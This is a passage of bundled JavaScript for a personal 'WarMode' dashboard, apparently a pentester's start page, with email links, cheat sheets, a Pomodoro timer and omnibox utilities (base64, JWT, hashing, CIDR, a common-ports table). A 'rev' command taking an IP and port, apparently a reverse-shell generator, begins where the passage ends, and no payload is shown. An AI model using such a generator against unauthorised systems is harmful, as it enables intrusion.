    exports["openSiteModal"] = openSiteModal;
    exports["closeSiteModal"] = closeSiteModal;
    exports["saveNewSite"] = saveNewSite;
  });

  __def("gmail", function (module, exports, __req) {
    "use strict";
    var storage = __req("storage");
    var store = storage.store;
    var core = __req("core");
    var escapeHTML = core.escapeHTML;
    var showToast = core.showToast;
    var createElement = core.createElement;
    var normalizeUrl = core.normalizeUrl;
    var overlay = __req("overlay");
    var closeCheatOverlay = overlay.closeCheatOverlay;
    var closeOmniSuggestions = overlay.closeOmniSuggestions;

/**
 * Gmail Module - Dynamic email accounts
 */





function initGmail() {
  renderGmails();
  store.subscribe('GMAILS', renderGmails);
}

function renderGmails() {
  const container = document.getElementById('gmail-list');
  if (!container) return;
  container.innerHTML = '';

  const gmailsData = store.get('GMAILS') || [];
  const isEditMode = document.body.classList.contains('edit-mode');

  if (gmailsData.length === 0) {
    container.innerHTML = `<div class="gm-empty">No mailboxes added. Click '+ Email' above to add one.</div>`;
    return;
  }

  gmailsData.forEach((acc, idx) => {
    const row = createElement('div', { className: 'gm-item-row' });

    const badgeChar = (acc.name || acc.email || 'U').trim().charAt(0).toUpperCase();
    const badgeColor = /^#[0-9a-fA-F]{3,8}$/.test(acc.color || '') ? acc.color : '#00897b';
    const targetHref = acc.url && acc.url.trim()
      ? normalizeUrl(acc.url)
      : `https://mail.google.com/mail/?authuser=${encodeURIComponent(acc.email || '')}`;

    const link = createElement('a', {
      href: targetHref,
      target: '_blank',
      rel: 'noopener noreferrer',
      className: 'gm-link',
      title: isEditMode ? 'Click to Edit Email' : (acc.email || ''),
      dataset: { idx: String(idx) },
    });
    link.innerHTML = `
      <span class="gm-badge" style="background: ${escapeHTML(badgeColor)};">${escapeHTML(badgeChar)}</span>
      <div class="gm-info">
        <span>${escapeHTML(acc.name || '')}</span>
        <small>${escapeHTML(acc.email || '')}</small>
      </div>
    `;

    const actions = createElement('div', { className: 'gm-item-actions' });
    const editBtn = createElement('button', {
      type: 'button',
      className: 'gm-act-btn',
      title: 'Edit Email',
      innerHTML: '✏️',
    });
    const delBtn = createElement('button', {
      type: 'button',
      className: 'gm-act-btn del',
      title: 'Remove Email',
      innerHTML: '×',
    });

    link.addEventListener('click', (e) => {
      if (isEditMode) {
        e.preventDefault();
        openGmailModal(idx);
      }
    });
    editBtn.addEventListener('click', () => openGmailModal(idx));
    delBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      deleteGmailAccount(idx);
    });

    actions.appendChild(editBtn);
    actions.appendChild(delBtn);
    row.appendChild(link);
    row.appendChild(actions);
    container.appendChild(row);
  });
}

function openGmailModal(editIdx = null) {
  const idxInput = document.getElementById('gmail-edit-idx');
  const nameInput = document.getElementById('gmail-name-input');
  const emailInput = document.getElementById('gmail-email-input');
  const colorInput = document.getElementById('gmail-color-input');
  const urlInput = document.getElementById('gmail-url-input');
  const titleEl = document.getElementById('gmail-modal-title');
  const gmailsData = store.get('GMAILS') || [];

  if (editIdx !== null && gmailsData[editIdx]) {
    const item = gmailsData[editIdx];
    idxInput.value = String(editIdx);
    nameInput.value = item.name || '';
    emailInput.value = item.email || '';
    colorInput.value = item.color || '#00897b';
    urlInput.value = item.url || '';
    if (titleEl) titleEl.textContent = 'EDIT EMAIL ACCOUNT';
  } else {
    idxInput.value = '';
    nameInput.value = '';
    emailInput.value = '';
    colorInput.value = '#00897b';
    urlInput.value = '';
    if (titleEl) titleEl.textContent = 'ADD EMAIL ACCOUNT';
  }
  document.getElementById('gmail-modal').classList.add('show');
  nameInput.focus();
}

function closeGmailModal() {
  const modal = document.getElementById('gmail-modal');
  if (modal) modal.classList.remove('show');
}

function saveGmailAccount() {
  const editIdxStr = document.getElementById('gmail-edit-idx').value;
  const name = document.getElementById('gmail-name-input').value.trim();
  const email = document.getElementById('gmail-email-input').value.trim();
  const rawColor = document.getElementById('gmail-color-input').value.trim();
  const color = /^#[0-9a-fA-F]{3,8}$/.test(rawColor) ? rawColor : '#00897b';
  let url = document.getElementById('gmail-url-input').value.trim();

  if (!name || !email) {
    showToast('Please enter both Display Name and Email ID');
    return;
  }
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    showToast('Please enter a valid Email ID');
    return;
  }
  if (url) {
    url = normalizeUrl(url);
    if (url === '#') {
      showToast('Please enter a valid URL');
      return;
    }
  }

  const obj = { name, email, color, url };
  const gmailsData = store.get('GMAILS');

  if (editIdxStr !== '') {
    gmailsData[parseInt(editIdxStr, 10)] = obj;
    showToast(`✔ Updated ${email}`);
  } else {
    gmailsData.push(obj);
    showToast(`✔ Added ${email}`);
  }
  store.set('GMAILS', gmailsData);
  closeGmailModal();
}

function deleteGmailAccount(idx) {
  const gmailsData = store.get('GMAILS');
  const removed = gmailsData.splice(idx, 1)[0];
  store.set('GMAILS', gmailsData);
  showToast(`Removed ${removed ? removed.email : 'email'}`);
}

function closeGmailMenu() {
  const menu = document.getElementById('gmail-menu');
  const btn = document.getElementById('gmail-btn');
  if (menu) menu.classList.remove('show');
  if (btn) {
    btn.classList.remove('open');
    btn.removeAttribute('aria-expanded');
  }
}

function toggleGmailMenu(e) {
  if (e) {
    if (e.preventDefault) e.preventDefault();
    if (e.stopPropagation) e.stopPropagation();
  }
  const menu = document.getElementById('gmail-menu');
  const btn = document.getElementById('gmail-btn');
  if (!menu) return;
  if (!menu.classList.contains('show')) {
    closeCheatOverlay();
    closeOmniSuggestions();
    menu.classList.add('show');
    if (btn) {
      btn.classList.add('open');
      btn.setAttribute('aria-expanded', 'true');
    }
    renderGmails();
  } else {
    closeGmailMenu();
  }
}

// Referenced by closeGmailMenu/toggleGmailMenu so bundlers keep the overlay contract explicit.
    exports["initGmail"] = initGmail;
    exports["renderGmails"] = renderGmails;
    exports["openGmailModal"] = openGmailModal;
    exports["closeGmailModal"] = closeGmailModal;
    exports["saveGmailAccount"] = saveGmailAccount;
    exports["closeGmailMenu"] = closeGmailMenu;
    exports["toggleGmailMenu"] = toggleGmailMenu;
    exports["closeCheatOverlay"] = closeCheatOverlay;
    exports["closeOmniSuggestions"] = closeOmniSuggestions;
  });

  __def("tools", function (module, exports, __req) {
    "use strict";
    var storage = __req("storage");
    var store = storage.store;
    var core = __req("core");
    var showToast = core.showToast;
    var createElement = core.createElement;
    var overlay = __req("overlay");
    var closeCheatOverlay = overlay.closeCheatOverlay;
    var getActiveCheatKey = overlay.getActiveCheatKey;
    var search = __req("search");
    var handleSearch = search.handleSearch;

/**
 * Tools Module - Cheat sheets and quick tools
 */






let currentToolModalMode = 'cheat';
let dragToolIdx = null;

function initTools() {
  renderQuickTools();
  store.subscribe('QUICK_TOOLS', renderQuickTools);
  store.subscribe('CHEATS', renderQuickTools);
}

function renderQuickTools() {
  const bar = document.getElementById('quick-cmd-bar');
  if (!bar) return;
  bar.innerHTML = '';

  const quickTools = store.get('QUICK_TOOLS') || [];
  const isEditMode = document.body.classList.contains('edit-mode');

  const label = createElement('span', { className: 'q-label', textContent: '⚡ Instant Tools' });
  bar.appendChild(label);

  if (quickTools.length === 0) {
    bar.appendChild(
      createElement('span', {
        className: 'q-empty',
        textContent: isEditMode
          ? 'No tools yet — add one with "+ Tool / Cheat".'
          : 'No instant tools configured. Press ⌥E to add some.',
      })
    );
  }

  const frag = document.createDocumentFragment();

  quickTools.forEach((tool, idx) => {
    const wrap = createElement('div', {
      className: 'q-chip-wrap',
      dataset: { idx: String(idx) },
      draggable: isEditMode ? 'true' : 'false',
    });

    const btn = createElement('button', {
      type: 'button',
      className: 'q-chip',
      textContent: tool.label,
      title: isEditMode ? `Click to edit '${tool.cmd}'` : `Command: ${tool.cmd}`,
      'aria-label': isEditMode ? `Edit ${tool.label}` : `Run ${tool.label}`,
    });

    btn.onclick = () => {
      if (isEditMode) {
        openToolModal(idx);
      } else if (tool.mode === 'fill') {
        fillQuickCmd(tool.cmd);
      } else {
        runQuickCmd(tool.cmd);
      }
    };

    const delBtn = createElement('button', {
      type: 'button',
      className: 'delete-btn del-tool-btn',
      textContent: '×',
      title: `Remove ${tool.label}`,
      'aria-label': `Remove ${tool.label}`,
    });

    delBtn.onclick = (e) => {
      e.stopPropagation();
      deleteQuickTool(idx);
    };

    if (isEditMode) {
      wrap.addEventListener('dragstart', function (e) {
        dragToolIdx = parseInt(this.dataset.idx, 10);
        if (e.dataTransfer) e.dataTransfer.effectAllowed = 'move';
        setTimeout(() => this.classList.add('dragging'), 0);
      });
      wrap.addEventListener('dragover', (e) => {
        e.preventDefault();
        wrap.classList.add('drag-over');
      });
      wrap.addEventListener('dragleave', () => wrap.classList.remove('drag-over'));
      wrap.addEventListener('drop', function (e) {
        e.preventDefault();
        wrap.classList.remove('drag-over');
        const targetIdx = parseInt(this.dataset.idx, 10);
        if (dragToolIdx === null || dragToolIdx === targetIdx) return;

        const tools = store.get('QUICK_TOOLS');
        if (dragToolIdx < 0 || dragToolIdx >= tools.length) return;
        const [moved] = tools.splice(dragToolIdx, 1);
        if (!moved) return;
        const insertAt = Math.max(0, Math.min(targetIdx, tools.length));
        tools.splice(insertAt, 0, moved);
        dragToolIdx = null;
        store.set('QUICK_TOOLS', tools);
      });
      wrap.addEventListener('dragend', function () {
        this.classList.remove('dragging');
        dragToolIdx = null;
      });
    }

    wrap.appendChild(btn);
    wrap.appendChild(delBtn);
    frag.appendChild(wrap);
  });

  bar.appendChild(frag);

  const addBtn = createElement('button', {
    type: 'button',
    className: 'edit-toggle add-tool-btn',
    innerHTML: '+ Tool / Cheat',
    title: 'Create your own Cheat-Sheet or Instant Tool',
  });

  addBtn.onclick = () => openToolModal(null);
  bar.appendChild(addBtn);
}

function deleteQuickTool(idx) {
  const quickTools = store.get('QUICK_TOOLS');
  const removed = quickTools.splice(idx, 1)[0];
  store.set('QUICK_TOOLS', quickTools);
  showToast(`Removed ${removed ? removed.label : 'tool'}`);
}

function setToolModalMode(mode) {
  currentToolModalMode = mode;
  document.getElementById('tt-cheat-btn').classList.toggle('active', mode === 'cheat');
  document.getElementById('tt-cmd-btn').classList.toggle('active', mode === 'cmd');
  const keyInput = document.getElementById('tool-key-input');
  const contentInput = document.getElementById('tool-content-input');

  if (mode === 'cheat') {
    keyInput.placeholder = "Cheat Key (e.g., rust -> runs 'cheat rust')";
    contentInput.style.display = 'block';
  } else {
    keyInput.placeholder = "Command to Run/Fill (e.g., pomo 45, rev 10.10.14.5 9001, gh )";
    contentInput.style.display = 'none';
  }
}

function openToolModal(editIdx = null, forceCheatKey = null) {
  const modal = document.getElementById('tool-modal');
  const idxInput = document.getElementById('tool-edit-idx');
  const lblInput = document.getElementById('tool-label-input');
  const keyInput = document.getElementById('tool-key-input');
  const contentInput = document.getElementById('tool-content-input');
  const quickTools = store.get('QUICK_TOOLS');
  const cheatSheets = store.get('CHEATS');

  idxInput.value = editIdx !== null && editIdx !== undefined ? String(editIdx) : '';

  if (forceCheatKey) {
    setToolModalMode('cheat');
    const existingIdx = quickTools.findIndex(t => t.cmd.toLowerCase() === `cheat ${forceCheatKey.toLowerCase()}`);
    idxInput.value = existingIdx >= 0 ? String(existingIdx) : '';
    lblInput.value = existingIdx >= 0 ? quickTools[existingIdx].label : `📋 ${forceCheatKey.toUpperCase()}`;
    keyInput.value = forceCheatKey.toLowerCase();
    contentInput.value = cheatSheets[forceCheatKey.toLowerCase()] || '';
  } else if (editIdx !== null && quickTools[editIdx]) {
    const item = quickTools[editIdx];
    lblInput.value = item.label;
    if (item.cmd.toLowerCase().startsWith('cheat ')) {
      const cKey = item.cmd.slice(6).trim().toLowerCase();
      setToolModalMode('cheat');
      keyInput.value = cKey;
      contentInput.value = cheatSheets[cKey] || '';
    } else {
      setToolModalMode('cmd');
      keyInput.value = item.cmd;
      contentInput.value = '';
    }
  } else {
    setToolModalMode('cheat');
    lblInput.value = '';
    keyInput.value = '';
    contentInput.value = '';
  }

  modal.classList.add('show');
  lblInput.focus();
}

function closeToolModal() {
  document.getElementById('tool-modal').classList.remove('show');
}

function saveCustomTool() {
  const editIdxStr = document.getElementById('tool-edit-idx').value;
  const label = document.getElementById('tool-label-input').value.trim();
  const rawKey = document.getElementById('tool-key-input').value;
  const content = document.getElementById('tool-content-input').value.trim();
  const keyTrimmed = rawKey.trim();

  if (!label || !keyTrimmed) {
    showToast('Please fill in both Label and Key/Command');
    return;
  }

  const cheatSheets = store.get('CHEATS');
  const quickTools = store.get('QUICK_TOOLS');
  const editIdx = editIdxStr === '' ? null : parseInt(editIdxStr, 10);

  if (currentToolModalMode === 'cheat') {
    const cleanKey = keyTrimmed
      .replace(/^cheat\s+/i, '')
      .toLowerCase()
      .replace(/\s+/g, '_')
      .replace(/[^a-z0-9_\-]/g, '');

    if (!cleanKey) {
      showToast('Cheat key must contain letters or numbers');
      return;
    }

    cheatSheets[cleanKey] = content || `${label.toUpperCase()} CHEAT-SHEET:\n• Add your commands here`;
    store.set('CHEATS', cheatSheets);

    const toolObj = { label, mode: 'run', cmd: `cheat ${cleanKey}` };
    if (editIdx !== null && quickTools[editIdx]) {
      quickTools[editIdx] = toolObj;
    } else {
      const existing = quickTools.findIndex(t => t.cmd.toLowerCase() === `cheat ${cleanKey}`);
      if (existing >= 0) quickTools[existing] = toolObj;
      else quickTools.push(toolObj);
    }
    store.set('QUICK_TOOLS', quickTools);
    closeToolModal();
    runQuickCmd(`cheat ${cleanKey}`);
    showToast(`✔ Saved Cheat-Sheet: cheat ${cleanKey}`);
  } else {
    // A trailing space in the raw (untrimmed) input means "prefill the search
    // box" rather than "run immediately" — e.g. "gh " or "b64 ".
    const isFill = /\s$/.test(rawKey);
    const cmd = keyTrimmed;
    const toolObj = { label, mode: isFill ? 'fill' : 'run', cmd };

    if (editIdx !== null && quickTools[editIdx]) {
      quickTools[editIdx] = toolObj;
    } else {
      const existing = quickTools.findIndex(t => t.cmd === cmd);
      if (existing >= 0) quickTools[existing] = toolObj;
      else quickTools.push(toolObj);
    }
    store.set('QUICK_TOOLS', quickTools);
    closeToolModal();
    if (!isFill) runQuickCmd(cmd);
    else fillQuickCmd(cmd + ' ');
    showToast(`✔ Saved Instant Tool: ${label}`);
  }
}

function runQuickCmd(cmdText) {
  const q = document.getElementById('q');
  if (!q) return;
  q.value = cmdText;
  handleSearch(new Event('submit'));
}

function fillQuickCmd(prefixText) {
  const q = document.getElementById('q');
  if (!q) return;
  closeCheatOverlay();
  q.value = prefixText;
  q.focus();
}

function editCurrentCheatSheet() {
  const cheatKey = getActiveCheatKey();
  if (cheatKey) {
    openToolModal(null, cheatKey);
  }
}
    exports["initTools"] = initTools;
    exports["renderQuickTools"] = renderQuickTools;
    exports["setToolModalMode"] = setToolModalMode;
    exports["openToolModal"] = openToolModal;
    exports["closeToolModal"] = closeToolModal;
    exports["saveCustomTool"] = saveCustomTool;
    exports["runQuickCmd"] = runQuickCmd;
    exports["fillQuickCmd"] = fillQuickCmd;
    exports["editCurrentCheatSheet"] = editCurrentCheatSheet;
  });

  __def("timer", function (module, exports, __req) {
    "use strict";
    var core = __req("core");
    var showToast = core.showToast;
    var dayKey = core.dayKey;
    var scratchpad = __req("scratchpad");
    var renderPomoChart = scratchpad.renderPomoChart;

/**
 * Timer Module - Clock, Pomodoro, Day Progress
 */




let isPomodoroActive = false;
let pomodoroTimer = null;
let pomodoroSeconds = 25 * 60;
let clockLoopStarted = false;

function initTimer() {
  dateTime();
  updateDay();
  setInterval(updateDay, 60000);
  resetStatus();
}

function playCompletionChime() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    [528, 660, 792].forEach((freq, idx) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = 'sine';
      osc.frequency.value = freq;
      gain.gain.setValueAtTime(0.001, ctx.currentTime + idx * 0.18);
      gain.gain.exponentialRampToValueAtTime(0.12, ctx.currentTime + idx * 0.18 + 0.04);
      gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + idx * 0.18 + 1.1);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(ctx.currentTime + idx * 0.18);
      osc.stop(ctx.currentTime + idx * 0.18 + 1.15);
    });
  } catch (e) {}
}

function dateTime() {
  const clockElem = document.getElementById('clock-display');
  if (clockElem && !isPomodoroActive) {
    clockElem.innerText = new Date().toLocaleTimeString();
  }
  if (!clockLoopStarted) {
    clockLoopStarted = true;
    setInterval(dateTime, 1000);
  }
}

function resetStatus() {
  const sysStatus = document.getElementById('sys-status');
  if (sysStatus) {
    const n = getPomoCount();
    // Only surface the chip when there is something meaningful to say; an
    // idle "SYSTEM: ACTIVE" banner is pure noise.
    if (n > 0) {
      sysStatus.innerText = `🍅 ${n} today`;
      sysStatus.hidden = false;
    } else {
      sysStatus.innerText = '';
      sysStatus.hidden = true;
    }
    sysStatus.style.color = 'var(--color-success)';
  }
  document.title = 'WarMode';
  renderPomoChart();
}

function getPomoCount(dateObj = new Date()) {
  return +localStorage.getItem('traichu_pomo_' + dayKey(dateObj)) || 0;
}

function bumpPomo() {
  localStorage.setItem('traichu_pomo_' + dayKey(new Date()), getPomoCount() + 1);
}

function startCustomPomodoro(minutes = 25, label = "POMODORO") {
  clearInterval(pomodoroTimer);
  isPomodoroActive = true;
  pomodoroSeconds = Math.max(1, Math.round(minutes * 60));

  const sysStatus = document.getElementById('sys-status');
  const clockElem = document.getElementById('clock-display');
  if (sysStatus) {
    sysStatus.innerText = `[${label}: ${minutes}m]`;
    sysStatus.hidden = false;
    sysStatus.style.color = label === "BREAK" ? "var(--color-primary)" : "var(--color-warning)";
  }

  const tick = () => {
    const mins = Math.floor(pomodoroSeconds / 60).toString().padStart(2, '0');
    const secs = (pomodoroSeconds % 60).toString().padStart(2, '0');
    if (clockElem) clockElem.innerText = `⏱ ${mins}:${secs}`;
    document.title = `⏱ ${mins}:${secs} · WarMode`;
  };

  tick();
  pomodoroTimer = setInterval(() => {
    pomodoroSeconds--;
    if (pomodoroSeconds <= 0) {
      pomodoroSeconds = 0;
      clearInterval(pomodoroTimer);
      pomodoroTimer = null;
      isPomodoroActive = false;
      if (label !== "BREAK") bumpPomo();
      playCompletionChime();
      resetStatus();
      dateTime();
      showToast(label === "BREAK" ? "Break complete! Ready for WarMode." : "🍅 Focus session complete! Take a 5m break.");
      return;
    }
    tick();
  }, 1000);
}

function togglePomodoro() {
  if (!isPomodoroActive) {
    startCustomPomodoro(25, "POMODORO");
    showToast("🍅 25m Focus Session Started");
  } else {
    clearInterval(pomodoroTimer);
    pomodoroTimer = null;
    isPomodoroActive = false;
    resetStatus();
    dateTime();
    showToast("Timer Stopped");
  }
}

function updateDay() {
  const n = new Date();
  const p = Math.round((n - new Date(n.getFullYear(), n.getMonth(), n.getDate())) / 864e5 * 100);
  const bar = document.getElementById('dp-bar'), txt = document.getElementById('dp-txt');
  if (bar) bar.style.width = p + '%';
  if (txt) txt.textContent = 'Day ' + p + '%';
}


function getPomodoroState() {
  return { isPomodoroActive, pomodoroTimer, pomodoroSeconds };
}
    exports["initTimer"] = initTimer;
    exports["resetStatus"] = resetStatus;
    exports["startCustomPomodoro"] = startCustomPomodoro;
    exports["togglePomodoro"] = togglePomodoro;
    exports["getPomodoroState"] = getPomodoroState;
  });

  __def("search", function (module, exports, __req) {
    "use strict";
    var storage = __req("storage");
    var store = storage.store;
    var restoreDefaultSites = storage.restoreDefaultSites;
    var core = __req("core");
    var escapeHTML = core.escapeHTML;
    var showToast = core.showToast;
    var copyText = core.copyText;
    var overlay = __req("overlay");
    var showOverlay = overlay.showOverlay;
    var closeCheatOverlay = overlay.closeCheatOverlay;
    var timer = __req("timer");
    var startCustomPomodoro = timer.startCustomPomodoro;
    var focus = __req("focus");
    var setFocus = focus.setFocus;
    var widget = __req("widget");
    var parsePriority = widget.parsePriority;
    var shortcuts = __req("shortcuts");
    var toggleShortcutsModal = shortcuts.toggleShortcutsModal;

/**
 * Search Module - Omnibox, command handling
 */









let omniSelectedIndex = -1;
let currentOmniItems = [];

const commonPorts = {
  "20": "FTP Data", "21": "FTP Control", "22": "SSH", "23": "Telnet",
  "25": "SMTP", "53": "DNS", "67": "DHCP", "69": "TFTP", "80": "HTTP",
  "88": "Kerberos", "110": "POP3", "111": "RPCbind", "135": "MS-RPC",
  "139": "NetBIOS", "143": "IMAP", "161": "SNMP", "389": "LDAP",
  "443": "HTTPS", "445": "SMB", "514": "Syslog", "636": "LDAPS",
  "1433": "MSSQL", "1521": "Oracle DB", "2049": "NFS", "3306": "MySQL",
  "3389": "RDP", "5432": "PostgreSQL", "5900": "VNC", "5985": "WinRM HTTP",
  "6379": "Redis", "8080": "HTTP-Proxy", "8443": "HTTPS-Alt", "27017": "MongoDB"
};

function initSearch() {
  const q = document.getElementById('q');
  if (q) {
    q.addEventListener('input', (e) => renderOmniSuggestions(e.target.value));
    q.addEventListener('keydown', handleOmniKeydown);
  }
  window.closeOmniSuggestions = closeOmniSuggestions;
}

function getAllSearchableItems() {
  const items = [];
  const bookmarksData = store.get('BOOKMARKS') || [];
  const dockData = store.get('DOCK') || [];
  const gmailsData = store.get('GMAILS') || [];
  const cheatSheets = store.get('CHEATS') || {};

  bookmarksData.forEach(col => {
    (col.links || []).forEach(l => {
      items.push({ type: col.title.replace(/^\/\/\s*/, ''), name: l.name, url: l.url });
    });
  });
  dockData.forEach(d => items.push({ type: 'DOCK', name: d.name, url: d.url }));
  gmailsData.forEach(g => {
    const addr = g.email || '';
    items.push({
      type: 'MAIL',
      name: `${g.name || 'Mailbox'}${addr ? ` (${addr})` : ''}`,
      url: g.url && g.url.trim()
        ? g.url.trim()
        : `https://mail.google.com/mail/?authuser=${encodeURIComponent(addr)}`,
    });
  });
  Object.keys(cheatSheets).forEach(k => {
    items.push({ type: 'CHEAT', name: `cheat ${k}`, cmd: `cheat ${k}` });
  });
  return items;
}

function renderOmniSuggestions(inputVal) {
  const box = document.getElementById('omni-suggestions');
  if (!box) return;
  const trimmed = String(inputVal || '').trim();
  if (!trimmed) {
    closeOmniSuggestions();
    return;
  }

  const qLower = trimmed.toLowerCase();
  const matches = getAllSearchableItems().filter(item =>
    item.name.toLowerCase().includes(qLower) || item.type.toLowerCase().includes(qLower)
  ).slice(0, 6);

  if (matches.length === 0) {
    closeOmniSuggestions();
    return;
  }

  currentOmniItems = matches;
  omniSelectedIndex = -1;
  box.innerHTML = '';
  matches.forEach((m, idx) => {
    const div = document.createElement('div');
    div.className = 'omni-item';
    div.setAttribute('role', 'option');
    div.innerHTML = `
      <div class="omni-left">
        <span>${escapeHTML(m.name)}</span>
        <small style="color:var(--color-text-secondary)">${escapeHTML(m.url || m.cmd || '')}</small>
      </div>
      <span class="omni-badge">${escapeHTML(m.type)}</span>
    `;
    div.addEventListener('mousedown', (e) => {
      e.preventDefault();
      executeOmniItem(idx);
    });
    box.appendChild(div);
  });
  box.classList.add('show');

  window.currentOmniItems = currentOmniItems;
  window.omniSelectedIndex = omniSelectedIndex;
}

function closeOmniSuggestions() {
  const box = document.getElementById('omni-suggestions');
  if (box) box.classList.remove('show');
  currentOmniItems = [];
  omniSelectedIndex = -1;
  window.currentOmniItems = [];
  window.omniSelectedIndex = -1;
}

function setOmniSelection(nextIndex) {
  if (!currentOmniItems.length) return;
  omniSelectedIndex = ((nextIndex % currentOmniItems.length) + currentOmniItems.length) % currentOmniItems.length;
  window.omniSelectedIndex = omniSelectedIndex;
  const box = document.getElementById('omni-suggestions');
  if (!box) return;
  box.querySelectorAll('.omni-item').forEach((el, idx) => {
    const active = idx === omniSelectedIndex;
    el.classList.toggle('active', active);
    if (active) el.scrollIntoView({ block: 'nearest' });
  });
}

function handleOmniKeydown(e) {
  const isOpen = omniSelectedIndex >= 0 || currentOmniItems.length > 0;
  if (!isOpen) return;
  if (e.key === 'ArrowDown') {
    e.preventDefault();
    setOmniSelection(omniSelectedIndex + 1);
  } else if (e.key === 'ArrowUp') {
    e.preventDefault();
    setOmniSelection(omniSelectedIndex - 1);
  } else if (e.key === 'Enter' && omniSelectedIndex >= 0) {
    e.preventDefault();
    executeOmniItem(omniSelectedIndex);
  } else if (e.key === 'Escape') {
    closeOmniSuggestions();
  }
}

function executeOmniItem(idx) {
  const item = currentOmniItems[idx];
  if (!item) return;
  closeOmniSuggestions();
  if (item.url) {
    window.location.href = item.url;
  } else if (item.cmd) {
    const q = document.getElementById('q');
    if (q) q.value = item.cmd;
    handleSearch(new Event('submit'));
  }
}

function handleSearch(e) {
  if (e && e.preventDefault) e.preventDefault();
  const inputElem = document.getElementById('q');
  if (!inputElem) return;

  const input = String(inputElem.value || '').trim();
  if (!input) return;

  const parts = input.split(/\s+/);
  const prefix = parts[0].toLowerCase();
  const query = parts.slice(1).join(' ');

  const clearInput = () => {
    inputElem.value = '';
    closeOmniSuggestions();
  };

  if (prefix === 'help' || prefix === '?') { toggleShortcutsModal(); return; }
  if (prefix === 'reset') { restoreDefaultSites(); clearInput(); return; }
  if (prefix === 'add' && query) {
    const { text, prio } = parsePriority(query);
    const todos = store.get('TODOS');
    todos.push({ text, prio, done: false });
    store.set('TODOS', todos);
    clearInput();
    showToast("Task Added");
    return;
  }
  if (prefix === 'focus' && query) {
    setFocus(query);
    clearInput();
    return;
  }
  if (prefix === 'pomo') {
    const mins = Math.min(180, Math.max(1, parseFloat(query) || 25));
    startCustomPomodoro(mins, "POMODORO");
    clearInput();
    showToast(`🍅 ${mins}m Pomodoro Started`);
    return;
  }
  if (prefix === 'break') {
    const mins = Math.min(60, Math.max(1, parseFloat(query) || 5));
    startCustomPomodoro(mins, "BREAK");
    clearInput();
    showToast(`☕ ${mins}m Break Started`);
    return;
  }
  if (prefix === 'cheat') {
    const sheetKey = query.toLowerCase().trim();
    const cheatSheets = store.get('CHEATS') || {};
    if (sheetKey && cheatSheets[sheetKey]) {
      showOverlay(`CHEAT-SHEET // ${sheetKey.toUpperCase()}`, cheatSheets[sheetKey], sheetKey);
    } else {
      const available = Object.keys(cheatSheets).join(', ') || '(none yet)';
      showOverlay(
        "AVAILABLE CHEAT-SHEETS",
        `Type: cheat <name> (or add one with '+ Tool / Cheat' in Edit Mode ⌥E)\n\nAvailable: ${available}`,
        null
      );
    }
    closeOmniSuggestions();
    return;
  }
  if (prefix === 'b64' && query) {
    let out = `Encoded: ${btoa(unescape(encodeURIComponent(query)))}`;
    try { out += `\nDecoded: ${decodeURIComponent(escape(atob(query)))}`; } catch (err) { out += `\nDecoded: (invalid base64)`; }
    showOverlay("BASE64 CODEC", out);
    return;
  }
  if (prefix === 'url' && query) {
    let out = `Encoded: ${encodeURIComponent(query)}`;
    try { out += `\nDecoded: ${decodeURIComponent(query)}`; } catch (err) { out += `\nDecoded: (invalid escape sequence)`; }
    showOverlay("URL CODEC", out);
    return;
  }
  if (prefix === 'hash' && query) {
    computeHashes(query);
    return;
  }
  if (prefix === 'jwt' && query) {
    try {
      const segs = query.split('.');
      if (segs.length < 2) throw new Error('not a JWT');
      const decode = (s) => {
        const b64 = s.replace(/-/g, '+').replace(/_/g, '/');
        const padded = b64 + '='.repeat((4 - (b64.length % 4)) % 4);
        return JSON.stringify(JSON.parse(decodeURIComponent(escape(atob(padded)))), null, 2);
      };
      showOverlay("JWT DECODER", `// HEADER:\n${decode(segs[0])}\n\n// PAYLOAD:\n${decode(segs[1])}`);
    } catch (err) {
      showOverlay("JWT ERROR", "Invalid JWT token format. Expected three base64url segments.");
    }
    return;
  }
  if (prefix === 'uuid') {
    const id = (crypto && typeof crypto.randomUUID === 'function')
      ? crypto.randomUUID()
      : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
          const r = Math.random() * 16 | 0;
          return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
        });
    copyText(id, "UUID v4 Copied");
    showOverlay("UUID GENERATOR", id);
    return;
  }
  if (prefix === 'pass') {
    const len = Math.min(128, Math.max(8, parseInt(query, 10) || 20));
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}";
    const arr = new Uint32Array(len);
    if (crypto && crypto.getRandomValues) {
      crypto.getRandomValues(arr);
    } else {
      for (let i = 0; i < len; i++) arr[i] = Math.floor(Math.random() * 0xffffffff);
    }
    const pwd = Array.from(arr, x => chars[x % chars.length]).join('');
    copyText(pwd, `${len}-char Password Copied`);
    showOverlay("HIGH-ENTROPY PASSWORD", pwd);
    return;
  }
  if (prefix === 'epoch') {
    if (!query) {
      const nowMs = Date.now();
      showOverlay(
        "UNIX EPOCH",
        `Current Epoch (s):  ${Math.floor(nowMs / 1000)}\nCurrent Epoch (ms): ${nowMs}\nISO: ${new Date(nowMs).toISOString()}`
      );
    } else {
      let ts = Number(query);
      if (!Number.isFinite(ts)) {
        showOverlay("EPOCH ERROR", "Enter a numeric Unix timestamp.");
        return;
      }
      if (Math.abs(ts) < 1e12) ts *= 1000;
      const d = new Date(ts);
      showOverlay(
        "EPOCH CONVERTER",
        `Input:  ${query}\nLocal:  ${d.toString()}\nUTC:    ${d.toUTCString()}\nISO:    ${d.toISOString()}`
      );
    }
    return;
  }
  if (prefix === 'hex' && query) {
    const num = Number(query);
    if (Number.isFinite(num) && query.trim() !== '') {
      showOverlay("NUMBER BASE CONVERTER", `Decimal: ${num}\nHex:     0x${num.toString(16).toUpperCase()}\nBinary:  0b${num.toString(2)}\nOctal:   0o${num.toString(8)}`);
    } else {
      const hexStr = Array.from(query).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ');
      showOverlay("ASCII TO HEX", hexStr);
    }
    return;
  }
  if (prefix === 'cidr' && query) {
    showOverlay("SUBNET / CIDR CALCULATOR", calculateCidr(query));
    return;
  }
  if (prefix === 'rev') {
    const [ip, port] = query.split(/\s+/);
